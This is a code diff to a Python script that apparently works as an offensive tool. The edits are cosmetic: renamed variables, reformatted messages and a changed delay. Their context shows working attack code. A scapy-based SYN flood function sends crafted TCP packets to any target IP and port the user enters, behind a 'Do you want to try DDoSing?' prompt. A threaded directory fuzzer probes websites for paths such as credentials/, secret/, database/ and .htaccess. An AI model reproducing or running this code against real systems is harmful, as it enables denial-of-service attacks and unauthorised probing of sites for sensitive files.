@@ -2,10 +2,10 @@ from colorama import Fore, init
 import requests
 from sys import stdout
 from scapy.all import *
+import socket
 from random import randint
 import threading
 import time
-import socket
 
 from scapy.layers.inet import TCP, IP
 
@@ -20,11 +20,11 @@ Fore.LBEX = Fore.LIGHTBLACK_EX
 Fore.LWEX = Fore.LIGHTWHITE_EX
 init()
 
-TARGET_DATA = ['database/', 'db/', 'imgs/', 'index.html', 'index.php', 'register/', 'login/', 'sql/', 'robots.txt',
-               'credentials/', 'secret/', 'videos/', 'images/', 'js/', 'scripts/', 'style/', 'Login/', 'Register/',
-               'logs/', 'users/', 'store/', 'transactions/', 'staff/', 'test/', 'tests/', 'css/', 'minecraft/',
-               'rules/', 'vote/', 'search/', 'realms/', 'about/', '.htaccess', 'data/', 'logins/', 'admin/',
-               'accounts/', 'access/', 'assets/', 'sitemap.xml', 'ghost/', 'p/', 'email/']
+dirs = ['database/', 'db/', 'imgs/', 'index.html', 'index.php', 'register/', 'login/', 'sql/', 'robots.txt',
+        'credentials/', 'secret/', 'videos/', 'images/', 'js/', 'scripts/', 'style/', 'Login/', 'Register/',
+        'logs/', 'users/', 'store/', 'transactions/', 'staff/', 'test/', 'tests/', 'css/', 'minecraft/',
+        'rules/', 'vote/', 'search/', 'realms/', 'about/', '.htaccess', 'data/', 'logins/', 'admin/',
+        'accounts/', 'access/', 'assets/', 'sitemap.xml', 'ghost/', 'p/', 'email/']
 FTP = False
 SSH = False
 Website = False
@@ -70,7 +70,7 @@ def randInt():
 
 def SYN_Flood(dstIP, dstPort, counter):
     total = 0
-    print("             Packets are sending ...")
+    print("             Packets are sending...")
 
     for x in range(0, counter):
         s_port = randInt()
@@ -89,22 +89,22 @@ def SYN_Flood(dstIP, dstPort, counter):
         TCP_Packet.window = window
 
         send(IP_Packet / TCP_Packet, verbose=0)
-        print(f'             [{total}] Sent packet')
+        print(f'             {Fore.LB}[{total}]{Fore.W} Sent packet to {Fore.LIGHTYELLOW_EX}{dstIP}:{dstPort}{Fore.W}')
         total += 1
 
     stdout.write("\n             Total packets sent: %i\n" % total)
 
 
 def info():
-    dstIP = input("\n             Target IP : ")
-    dstPort = input("             Target Port : ")
+    dstIP = input("\n             Target IP: ")
+    dstPort = input("             Target Port: ")
 
     return dstIP, int(dstPort)
 
 
 def ddos():
     dstIP, dstPort = info()
-    counter = input("             How many packets do you want to send : ")
+    counter = input("             How many packets do you want to send: ")
     SYN_Flood(dstIP, dstPort, int(counter))
 
 
@@ -168,9 +168,9 @@ def fuzz(directory):
 
 
 def threads_handler():
-    for directory in TARGET_DATA:
+    for directory in dirs:
         fuzz_thread = threading.Thread(target=fuzz, args=(directory,), daemon=True)  # Starts the fuzzing thread
-        time.sleep(1)
+        time.sleep(2)
         fuzz_thread.start()
 
 
@@ -195,6 +195,10 @@ if Website:
             threads_handler()
         else:
             print('               Ok.')
+            print('')
+    else:
+        print('               Ok.')
+        print('')
 
 if FTP:
     print('')
@@ -222,9 +226,9 @@ if SSH:
         print('''               Ok.
                     ''')
 
-
 ddos_ask = input('            Do you want to try DDoSing? y/n: ')
 if ddos_ask == 'y':
     ddos()
 else:
     print('               Ok.')
+    print('')
